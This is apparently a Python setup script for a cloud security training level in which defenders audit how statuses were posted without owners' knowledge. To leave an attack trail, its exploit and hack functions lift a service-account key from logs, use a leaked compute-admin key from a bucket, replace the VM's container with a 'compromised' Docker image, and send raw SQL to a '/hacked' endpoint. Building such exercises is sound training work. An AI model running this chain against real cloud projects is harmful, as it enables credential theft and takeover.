import random
import os
import subprocess
import time
import json
import csv
import sqlalchemy
import string
import google.auth
import requests
import shutil
import progressbar

from googleapiclient import discovery
from sqlalchemy.sql import text
from google.oauth2 import service_account, id_token
from core.framework import levels
from google.cloud import (
    storage,
    secretmanager,
    logging as glogging
)
from core.framework.cloudhelpers import (
    deployments,
    iam,
    gcstorage,
    cloudfunctions
)
import google.auth.transport.requests
from google.auth.transport.requests import AuthorizedSession

LEVEL_PATH = 'defender/audit'
FUNCTION_LOCATION = 'us-central1'
DB_SECRET_ID = 'defender_db_password'

class ProgBar:
    def __init__(self):
        self.value = 1
        self.format_custom_text = progressbar.FormatCustomText('Status: %(status_message)50s',{'status_message': 'Deploying Resources...'})
        self.bar = progressbar.ProgressBar(max_value=11, widgets=[progressbar.Timer(), progressbar.AnimatedMarker(), progressbar.Bar(),progressbar.Percentage(),'  ', self.format_custom_text])
        self.bar.update(self.value)
    def tick(self, message):
        self.value += 1
        self.bar.update(self.value)
        self.format_custom_text.update_mapping(status_message=message)

def create(second_deploy=True):
    bar = ProgBar()
    print("\nLevel initialization started for: " + LEVEL_PATH)

    nonce = str(random.randint(100000000000, 999999999999))
    credentials, project_id = google.auth.default()

    #the cloud function may need to know information about the vm in order to hit our API. put that info here.
    func_template_args = {}

    func_upload_url = cloudfunctions.upload_cloud_function(
            f'core/levels/{LEVEL_PATH}/resources/rmUser', FUNCTION_LOCATION, template_args=func_template_args)

    # Create database password value
    db_secret_value = ''
    for _ in range(0,64): 
        db_secret_value += random.choice(string.ascii_letters + string.digits)
    create_secret(DB_SECRET_ID, db_secret_value)

    config_template_args = {
        'nonce': nonce,
        'root_password': db_secret_value,
        'func_upload_url': func_upload_url
        }

    template_files = [
        'core/framework/templates/service_account.jinja',
        'core/framework/templates/iam_policy.jinja',
        'core/framework/templates/sql_db.jinja',
        'core/framework/templates/container_vm.jinja',
        'core/framework/templates/bucket_acl.jinja',
        'core/framework/templates/cloud_function.jinja'
        ]

    if second_deploy:
        deployments.insert(
            LEVEL_PATH,
            template_files=template_files,
            config_template_args=config_template_args,
            second_deploy=True
        )
    else:
        deployments.insert(
            LEVEL_PATH,
            template_files=template_files,
            config_template_args=config_template_args
        )

    print("\nLevel setup started for: " + LEVEL_PATH)

    bar.tick('Creating database tables')
    create_tables(db_secret_value)

    dev_key = iam.generate_service_account_key('dev-account')
    dev_sa = service_account.Credentials.from_service_account_info(json.loads(dev_key))
    compute_admin_key = iam.generate_service_account_key('compute-admin')
    logging_key = iam.generate_service_account_key('log-viewer')

    # add vm files to bucket
    bar.tick('Uploading container source to bucket')
    storage_client = storage.Client()
    vm_image_bucket = storage_client.get_bucket(f'vm-image-bucket-{nonce}')
    gcstorage.upload_directory_recursive(f'core/levels/{LEVEL_PATH}/resources/api-engine', f'vm-image-bucket-{nonce}')
    storage_blob = storage.Blob('compute-admin.json', vm_image_bucket)
    storage_blob.upload_from_string(compute_admin_key)
    
    bar.tick('Creating developer logs')
    #os.environ['GOOGLE_APPLICATION_CREDENTIALS'] = 'start/dev-account.json'
    url = "http://us-central1-" + project_id + ".cloudfunctions.net/rm-user-" + nonce

    req = google.auth.transport.requests.Request()
    id_token = google.oauth2.id_token.fetch_id_token(req, url)
    headers = {'Authorization': f"Bearer {id_token}"}
    data = {'name':'Robert Caldwell', 'authentication':dev_key}
    resp = req(url, method = 'POST', body = data, headers = headers)

    bar.tick('Starting exploit script')
    hostname = exploit(nonce, logging_key, bar)
    hack(hostname)
    bar.tick('Exploit complete')

    print(f'\nLevel creation complete for: {LEVEL_PATH}')
    start_message = ('Nefarious statuses are being posted by accounts without the owner\'s knowledge. Find out how this is happening.')
    levels.write_start_info(LEVEL_PATH, start_message)


def create_secret(secret_id, secret_value):
    _, project_id = google.auth.default()

    # Create Secrets Manager client
    sm_client = secretmanager.SecretManagerServiceClient()

    # Create secret
    secret = sm_client.create_secret(
        request={
            "parent": f'projects/{project_id}',
            "secret_id": secret_id,
            "secret": {
                "name": secret_value,
                "replication": {"automatic": {}}
            }
        }
    )

    # Add the secret version.
    version = sm_client.add_secret_version(
        request={"parent": secret.name, "payload": {"data": secret_value.encode()}}
    )


def create_tables(db_password):
    credentials, project_id = google.auth.default()
    service = discovery.build('sqladmin', 'v1beta4', credentials=credentials)
    response = service.instances().list(project=project_id).execute()
    connection_name = response['items'][0]['connectionName']
    instance_name = response['items'][0]['name']
    user = {'kind':'sql#user','name':'api-engine','project':project_id,'instance':instance_name,'password':db_password}
    service.users().insert(project=project_id, instance=instance_name, body=user).execute()

    proxy = subprocess.Popen([f'core/levels/{LEVEL_PATH}/cloud_sql_proxy', f'-instances={connection_name}=tcp:5432'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5)

    try:
        db_config = {
            "pool_size": 5,
            "max_overflow": 2,
            "pool_recycle": 1800,  # 30 minutes
        }

        db = sqlalchemy.create_engine(
            sqlalchemy.engine.url.URL(
                drivername="postgresql+pg8000",
                username="api-engine",
                password=db_password,
                database="userdata-db",
                host='127.0.0.1',
                port=5432
            ),
            **db_config
        )
        db.dialect.description_encoding = None

        devs = csv.DictReader(open(f'core/levels/{LEVEL_PATH}/resources/devs.csv', newline=''))
        with db.connect() as conn:
            conn.execute(
                """
                CREATE TABLE users (
                    user_id  SERIAL PRIMARY KEY,
                    name     TEXT              NOT NULL,
                    phone    TEXT              NOT NULL,
                    address  TEXT              NOT NULL
                );
                CREATE TABLE devs (
                    dev_id   SERIAL PRIMARY KEY,
                    name     TEXT              NOT NULL,
                    phone    TEXT              NOT NULL,
                    address  TEXT              NOT NULL
                );
                CREATE TABLE follows (
                    follow_id SERIAL PRIMARY KEY,
                    follower INT   NOT NULL REFERENCES users(user_id),
                    followee INT   NOT NULL REFERENCES users(user_id)
                );
                """
            )

            for dev in devs:
                stmt = text("INSERT INTO devs (name, phone, address) VALUES (:name, :phone, :address)")
                conn.execute(stmt, dev)
        db.dispose()
    except Exception as e:
        proxy.terminate()
        raise e
    proxy.terminate()


def exploit(nonce, logging_key, bar):
    credentials, project_id = google.auth.default()
    logging_client = glogging.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(logging_key)))

    # Because we are trying to access certain logs immediately after they are generated
    # we need to keep trying until the log actually shows up before we continue.
    while(True):
        try:
            logger = logging_client.logger('rmUser')
            logs = logger.list_entries()
            dev_key = list(logs)[-1].payload['auth']    
            storage_client = storage.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(dev_key)))
            blobs = list(storage_client.list_blobs(f'vm-image-bucket-{nonce}'))
            break
        except:
            time.sleep(5)

    bar.tick('Downloading bucket')
    temp_dir = 'tmp/'
    os.mkdir(temp_dir)
    for blob in blobs:
        blob.download_to_filename(f'{temp_dir}{blob.name}')

    with open(f'{temp_dir}compute-admin.json') as keyfile:    
        compute_admin_key = json.loads(keyfile.read())
    
    bar.tick('Updating Metadata')
    compute_api = discovery.build('compute', 'v1', credentials=service_account.Credentials.from_service_account_info(compute_admin_key))
    api_instance = compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()
    new_gce = '''
    metadata:
      name: a6
    spec:
      containers:
      - image: docker.io/aujxn/defender-audit-compromised:latest
        imagePullPolicy: Always
        name: a6
        ports:
        - containerPort: 80
          hostPort: 80
        volumeMounts: []
      volumes: []

  '''
    fingerprint = api_instance['metadata']['fingerprint']
    payload = {'fingerprint': fingerprint, 'items': [{'key': 'gce-container-declaration', 'value': new_gce}]}
    compute_api.instances().setMetadata(project=project_id, zone='us-west1-b', instance='api-engine', body=payload).execute()

    bar.tick('Stoping compute instance')
    compute_api.instances().stop(project=project_id, zone='us-west1-b', instance='api-engine').execute()
    while(compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['status'] != 'TERMINATED'):
        time.sleep(5)
    
    bar.tick('Starting compute instance')
    compute_api.instances().start(project=project_id, zone='us-west1-b', instance='api-engine').execute()
    while(compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['status'] != 'RUNNING'):
        time.sleep(5)
    shutil.rmtree(temp_dir)

    return compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['networkInterfaces'][0]['accessConfigs'][0]['natIP']


def hack(hostname):
    url = f'http://{hostname}/hacked'

    payload = {'sql': 'select * from devs;'}
    success = False    
    while(not success):
        try:
            response = requests.post(url, data=payload)
            if(response.status_code != 200):
                success = False
                time.sleep(5)
            else: success = True
        except:
            time.sleep(5)            
            success = False
    #print("\n" + response.text)     

def delete_secret(secret_id):
    _, project_id = google.auth.default()

    # Create Secrets Manager client
    sm_client = secretmanager.SecretManagerServiceClient()

    # Build the resource name of the secret.
    name = sm_client.secret_path(project_id, secret_id)

    # Delete secret.
    sm_client.delete_secret(request={"name": name})


def destroy():
    levels.delete_start_files()
    deployments.delete()
    delete_secret(DB_SECRET_ID)
